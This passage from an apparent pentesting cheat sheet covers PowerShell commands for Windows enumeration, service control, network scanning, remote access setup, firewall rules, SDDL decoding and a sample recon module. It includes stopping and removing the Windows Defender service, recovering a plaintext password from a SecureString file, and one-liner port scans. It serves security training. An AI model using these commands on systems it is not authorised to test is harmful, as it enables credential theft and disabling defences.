Get-Clipboard
```

## Processes

```powershell
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

## Services

```bash
Get-Service
Get-Service | Where-Object DisplayName -like "*defender*" | ft Displayname,ServiceName,Status # search by name
Start-Service WinDefend # start service
Stop-Service WinDefend # stop service
get-service spooler | Select-Object -Property Name, StartType, Status # check srv
Set-Service -Name Spooler -StartType Disabled #  modify a  srv by it property
remove-Service WinDefend # remove service  (need administrator perm)
```


## Password from secure string

```powershell
$pw=gc admin-pass.xml | convertto-securestring #Get the securestring from the file
$cred=new-object system.management.automation.pscredential("administrator", $pw)
$cred.getnetworkcredential() | fl * #Get plaintext password
```

## Scheduled Tasks

```powershell
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State
```

## Network

```powershell
ipconfig /all # on domain the dns server is the domain controller
arp -a # arp table 
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State  # Show ARP table
route print  # Show routing table
Get-DnsClientServerAddress -AddressFamily IPv4 | ft  # Show DNS server addresses
Get-Content C:\WINDOWS\System32\drivers\etc\hosts  # Show hosts file


nslookup ACADEMY-ICL-DC # check the dns 
netstat -an # print all connections and listening ports

Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address  # Show network interfaces
Get-NetIPInterface # Retrieve all visible network adapter properties.
Get-NetIPAddress # Retrieves the IP configurations of each adapter. (ipconfig)
Get-NetIPAddress -ifIndex <ifindex number>
Set-NetIPInterface -InterfaceIndex 25 -Dhcp Disabled # disabling the DHCP
Set-NetIPAddress -InterfaceIndex 25 -IPAddress 10.10.100.54 -PrefixLength 24 # change the ip and the PrefixLength ( also known as the subnet mask )
Restart-NetAdapter -Name 'Ethernet 3' # restart is with the `Name` property, which is the same as the `InterfaceAlias` from previous commands

# Check Port or Single IP
Test-NetConnection -Port 80 10.10.10.10
$ping = New-Object System.Net.Networkinformation.Ping; 1..254 | % { $ping.send("10.9.15.$_") | select address, status }  # Ping 10.9.15.1-254

"10.10.10.10","10.10.10.11" | % {echo ((New-Object Net.Sockets.TcpClient).Connect($_, 80)) "Port 80 on $_ is open!"} 2>$null  # Scan port 80 on multiple IPs

1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "TCP port $_ is open"} 2>$null  # Scan ports 1 to 1024

80,443,8080 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("10.10.10.10", $_)) "Port $_ is open!"} 2>$null  # Scan ports 80, 443, 8080


# setup ssh server
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*' # check if ssh installed
Start-Service sshd # start the ssh service
Set-Service -Name sshd -StartupType 'Automatic' # config ssh to auto start
ssh htb-student@10.129.224.248 # connect

# winRM
winrm quickconfig # setup
Test-WSMan -ComputerName "10.129.224.248" # Testing Unauthenticated Access
Enter-PSSession -ComputerName 10.129.224.248 -Credential htb-student -Authentication Negotiate # connection (work on linux too)

```


### SNMP

```powershell
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

### FIrewall
```bash
Get-NetFirewallRule -Enabled True # List all enabled firewall rules

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block # List outbound blocked rules
Get-NetFirewallRule -Direction Outbound -Enabled True -Action Allow # List outbound allowed rules
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Block # List inbound blocked rules
Get-NetFirewallRule -Direction Inbound -Enabled True -Action Allow # List inbound allowed rules

New-NetFirewallRule -DisplayName 'SSH (Port 22)' -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow # Allow SSH (port 22) inbound

Get-NetFirewallRule -Direction Outbound -Enabled True -Action Block | Format-Table -Property DisplayName, @{Name='Protocol';Expression={($PSItem | Get-NetFirewallPortFilter).Protocol}}, @{Name='LocalPort';Expression={($PSItem | Get-NetFirewallPortFilter).LocalPort}}, @{Name='RemotePort';Expression={($PSItem | Get-NetFirewallPortFilter).RemotePort}}, @{Name='RemoteAddress';Expression={($PSItem | Get-NetFirewallAddressFilter).RemoteAddress}}, Profile, Direction, Action # Get detailed firewall rule info
```
## **Converting the SDDL String into a Readable Format**

```powershell
PS C:\> ConvertFrom-SddlString "O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CIIO;CCDCLC;c975c901-6cea-4b6f-8319-d67f45449506;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;3e0f7e18-2c7a-4c10-ba82-4d926db99a3e;;S-1-5-21-3842939050-3880317879-2865463114-522)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-498)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;DD)(OA;CI;CR;89e95b76-444d-4c62-991a-0facbeda640c;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;S-1-5-21-3842939050-3880317879-2865463114-1164)(OA;CI;CC;4828cc14-1437-45bc-9b07-ad6f015e5f28;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a86-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967a9c-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aa5-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;bf967aba-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CC;5cb41ed0-0e4c-11d0-a286-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;RP;4c164200-20c0-11d0-a768-00aa006e0529;;S-1-5-21-3842939050-3880317879-2865463114-5181)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;9a7ad945-ca53-11d1-bbd0-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;bf967991-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967a06-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a0a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;3e74f60e-3e73-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;b1b3a417-ec55-4191-b327-b72e33e38af2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf96791a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;9a9a021e-4a5b-11d1-a9c3-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;0296c120-40da-11d1-a9c0-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;934de926-b09e-11d2-aa06-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5e353847-f36c-48be-a7f7-49685402503c;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;8d3bca50-1d7e-11d0-a081-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967953-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;e48d0154-bcf8-11d1-8702-00c04fb96050;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;275b2f54-982d-4dcd-b0ad-e53501445efb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967954-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;bf967961-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf967a68-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5fd42471-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;5430e777-c3ea-4024-902e-dde192204669;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;6f606079-3a82-4c1b-8efb-dcc8c91d26fe;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;bf967a7a-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;bf967a7f-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;614aea82-abc6-4dd0-a148-d67a59c72816;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;66437984-c3c5-498f-b269-987819ef484b;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;77b5b886-944a-11d1-aebd-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;a8df7489-c5ea-11d1-bbcb-0080c76670c0;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;1f298a89-de98-47b8-b5cd-572ad53d267e;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;f0f8ff9a-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;2cc06e9d-6f7e-426a-8825-0215de176e11;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;5fd424a1-1262-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;3263e3b8-fd6b-4c60-87f2-34bdaa9d69eb;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;WP;28630ebc-41d5-11d1-a9c1-0000f80367c1;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;WP;bf9679c0-0de6-11d0-a285-00aa003049e2;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;3e0abfd0-126a-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;WP;7cb4c7d3-8787-42b0-b438-3c5d479ad31e;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-526)(OA;CI;RPWP;5b47d60f-6090-40b2-9f37-2a4de88f3063;;S-1-5-21-3842939050-3880317879-2865463114-527)(OA;CI;DTWD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;DTWD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CCDCLCRPWPLO;f0f8ffac-1191-11d0-a060-00aa006c33ed;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CI;CCDCLCRPWPLO;e8b2aff2-59a7-4eac-9a70-819adef701dd;;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5172)(OA;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;018849b0-a981-11d2-a9ff-00c04f8eedd8;;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SD;;4828cc14-1437-45bc-9b07-ad6f015e5f28;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a86-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aa5-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;SD;;5cb41ed0-0e4c-11d0-a286-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;WD;;bf967a9c-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;CO)(OA;CIIO;SW;9b026da6-0d3c-465c-8bee-5199d7165cba;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a86-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967a9c-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;RP;b7c69e6d-2cc7-11d2-854e-00a0c983f608;bf967aba-0de6-11d0-a285-00aa003049e2;ED)(OA;CIIO;WP;ea1b7b93-5e48-46d5-bc6c-4df4fda78a35;bf967a86-0de6-11d0-a285-00aa003049e2;PS)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;c975c901-6cea-4b6f-8319-d67f45449506;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CIIO;CCDCLCSWRPWPDTLOCRSDRCWDWO;;f0f8ffac-1191-11d0-a060-00aa006c33ed;S-1-5-21-3842939050-3880317879-2865463114-5187)(OA;CINPIO;RPWPLOSD;;e8b2aff2-59a7-4eac-9a70-819adef701dd;S-1-5-21-3842939050-3880317879-2865463114-5186)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;BA)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ad-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;BA)(OA;;CR;e2a36dc9-ae17-47c3-b58b-be34c55ba633;;S-1-5-32-557)(OA;CIIO;LCRPLORC;;4828cc14-1437-45bc-9b07-ad6f015e5f28;RU)(OA;CIIO;LCRPLORC;;bf967a9c-0de6-11d0-a285-00aa003049e2;RU)(OA;CIIO;LCRPLORC;;bf967aba-0de6-11d0-a285-00aa003049e2;RU)(OA;;CR;05c74c5e-4deb-43b4-bd9f-86664c2a7fd5;;AU)(OA;;CR;89e95b76-444d-4c62-991a-0facbeda640c;;ED)(OA;;CR;ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501;;AU)(OA;;CR;280f369c-67c7-438e-ae98-1d46f3c6f541;;AU)(OA;;CR;1131f6aa-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;;CR;1131f6ae-9c07-11d1-f79f-00c04fc2dcd2;;ED)(OA;CI;RP;b1b3a417-ec55-4191-b327-b72e33e38af2;;NS)(OA;CI;RP;1f298a89-de98-47b8-b5cd-572ad53d267e;;AU)(OA;CI;RPWP;3f78c3e5-f79a-46bd-a0b8-9d18116ddc79;;PS)(OA;CIIO;RPWPCR;91e647de-d96f-4b70-9557-d63ff4f3ccd8;;PS)(A;;CCLCSWRPWPLOCRRCWDWO;;;DA)(A;CI;LCSWRPWPRC;;;S-1-5-21-3842939050-3880317879-2865463114-5213)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5172)(A;CI;LCRPLORC;;;S-1-5-21-3842939050-3880317879-2865463114-5187)(A;CI;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-3842939050-3880317879-2865463114-519)(A;;RPRC;;;RU)(A;CI;LC;;;RU)(A;CI;CCLCSWRPWPLOCRSDRCWDWO;;;BA)(A;;RP;;;WD)(A;;LCRPLORC;;;ED)(A;;LCRPLORC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;SY)(A;CI;LCRPWPRC;;;AN)S:(OU;CISA;WP;f30e3bbe-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(OU;CISA;WP;f30e3bbf-9ff0-11d1-b603-0000f80367c1;bf967aa5-0de6-11d0-a285-00aa003049e2;WD)(AU;SA;CR;;;DU)(AU;SA;CR;;;BA)(AU;SA;WPWDWO;;;WD)" 

Owner            : BUILTIN\Administrators
Group            : BUILTIN\Administrators
DiscretionaryAcl : {Everyone: AccessDenied (WriteData), Everyone: AccessAllowed (WriteExtendedAttributes), NT
                   AUTHORITY\ANONYMOUS LOGON: AccessAllowed (CreateDirectories, GenericExecute, ReadPermissions,
                   Traverse, WriteExtendedAttributes), NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERS: AccessAllowed
                   (CreateDirectories, GenericExecute, GenericRead, ReadAttributes, ReadPermissions,
                   WriteExtendedAttributes)...}
SystemAcl        : {Everyone: SystemAudit SuccessfulAccess (ChangePermissions, TakeOwnership, Traverse),
                   BUILTIN\Administrators: SystemAudit SuccessfulAccess (WriteAttributes), DOMAIN_NAME\Domain Users:
                   SystemAudit SuccessfulAccess (WriteAttributes), Everyone: SystemAudit SuccessfulAccess
                   (Traverse)...}
RawDescriptor    : System.Security.AccessControl.CommonSecurityDescriptor
```


## Powershell Scripting 
```bash
# PowerShell Scripting Notes

## PowerShell Extensions
PS1  ‚Üí PowerShell script file  
PSM1 ‚Üí PowerShell module file  
PSD1 ‚Üí PowerShell module metadata file  

## Module Commands
New-ModuleManifest <path>  ‚Üí Create module manifest  
ni <filename>.psm1 -ItemType File  ‚Üí Create module file  
Import-Module <modulename>  ‚Üí Import module  
$Variable = <value>  ‚Üí Define variable  
function <name> { <tasks> }  ‚Üí Define function  
# Comment  ‚Üí Single-line comment  
<# Comment #>  ‚Üí Multi-line comment  
Export-ModuleMember -Function <name> -Variable <var>  ‚Üí Export function/variable  
# exmple:

import-module ActiveDirectory

<# 
.Description  
This function performs some simple recon tasks for the user. We import the module and then issue the 'Get-Recon' command to retrieve our output. Each variable and line within the function and script are commented for your understanding. Right now, this only works on the local host from which you run it, and the output will be sent to a file named 'recon.txt' on the Desktop of the user who opened the shell. Remote Recon functions coming soon!  

.Example  
After importing the module run "Get-Recon"
'Get-Recon


    Directory: C:\Users\MTanaka\Desktop


Mode                 LastWriteTime         Length Name                                                                                                                                        
----                 -------------         ------ ----                                                                                                                                        
-a----         11/3/2022  12:46 PM              0 recon.txt '

.Notes  
Remote Recon functions coming soon! This script serves as our initial introduction to writing functions and scripts and making PowerShell modules.  

#>
function Get-Recon {  
    # Collect the hostname of our PC
    $Hostname = $env:ComputerName  
    # Collect the IP configuration
    $IP = ipconfig
    # Collect basic domain information
    $Domain = Get-ADDomain 
    # Output the users who have logged in and built out a basic directory structure in "C:\Users"
    $Users = Get-ChildItem C:\Users\
    # Create a new file to place our recon results in
    new-Item ~\Desktop\recon.txt -ItemType File 
    # A variable to hold the results of our other variables 
    $Vars = "***---Hostname info---***", $Hostname, "***---Domain Info---***", $Domain, "***---IP INFO---***",  $IP, "***---USERS---***", $Users
    # It does the thing 
    Add-Content ~\Desktop\recon.txt $Vars
  } 

Export-ModuleMember -Function Get-Recon -Variable Hostname 
```



{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
